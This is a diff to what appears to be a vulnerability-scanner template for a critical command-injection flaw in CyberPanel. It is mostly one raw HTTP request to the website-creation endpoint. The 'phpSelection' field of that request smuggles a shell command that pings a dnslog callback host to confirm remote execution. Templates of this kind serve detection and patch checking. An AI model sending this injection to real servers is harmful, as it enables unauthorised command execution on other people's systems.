@@ -3,12 +3,8 @@ info:
   name: Cyber​​Panel存在身份认证 命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xl2xkh0ek06i0g46'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xl2xkh0ek06i0g46
-    fofa: app="CyberPanel"
 http:
 - raw:
   - "OPTIONS /websites/submitWebsiteCreation HTTP/1.1\nHost: {{Hostname}}\nCookie: csrftoken=abc123; django_language=en; sessionid=xyz456\nAccept: application/json\nX-Csrftoken: abc123\nOrigin: https://添加目标\nReferer: https://添加目标/\nConnection: close\nContent-Type: application/json\nContent-Length: 246\n{\n    \"package\": \"Default\",\n    \"domainName\": \"cyberpanel.net\",\n    \"adminEmail\": \"cyberpanel@gmail.com\",\n    \"phpSelection\": \"PHP 8.0'; ping xyu7rh.dnslog.cn; #\",\n    \"ssl\": 0,\n    \"websiteOwner\": \"admin\",\n    \"dkimCheck\": 0,\n    \"openBasedir\": 0,\n    \"mailDomain\": 0,\n    \"apacheBackend\": 0\n}"
